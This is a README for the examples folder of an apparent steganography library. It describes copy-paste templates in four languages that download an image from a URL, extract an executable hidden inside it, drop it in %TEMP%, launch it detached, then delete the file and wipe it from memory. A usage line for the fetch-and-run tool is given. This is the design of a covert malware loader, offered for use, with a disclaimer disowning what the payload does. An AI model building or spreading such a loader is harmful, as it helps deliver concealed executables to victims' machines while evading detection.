# examples/ — copy-paste templates (decode first, launch explicitly)

## Decode-only (no execution)

| File | Language | PNG loading | Needs |
|---|---|---|---|
| `extract.cpp` | C++ | GDI+ glue (Windows) | `stego::stego` lib |
| `extract.c` | C (portable source) | raw RGB input (caller supplies) | amalgamated header |
| `extract.py` | Python | Pillow | `stegolib` |
| `extract.rs` | Rust | `image` crate | `stego` crate |

Each loads an image, decodes to a file, and stops. Start here.

## Fetch-and-run (download image, decode, execute payload)

| File | Language | Download | Launch |
|---|---|---|---|
| `fetch_run.cpp` | C++ (Windows) | WinINet HTTPS | drop `%TEMP%` + `CreateProcess` detached |
| `fetch_run.c` | C (Windows) | WinINet HTTPS | same, via C ABI |
| `fetch_run.rs` | Rust | `ureq` crate | `std::process::Command` |
| `fetch_run.py` | Python | `urllib` (stdlib) | `subprocess.Popen` detached |

```
fetch_run[.exe] <https-url> <out-name> [--password P] [--wait] [--keep]
```

Behavior (identical across all four): download → decode → require MZ magic
(refuses otherwise) → write drop → launch detached → delete drop after 2s.
`--wait` blocks for the exit code instead; `--keep` leaves the file.

The drop filename gains `.exe` when missing. Payload bytes are wiped from
the template's memory after writing where the language allows it.

Nothing here phones home, persists, or elevates: the templates fetch one
URL, run one file, and exit. What the payload does afterwards is outside
this project.
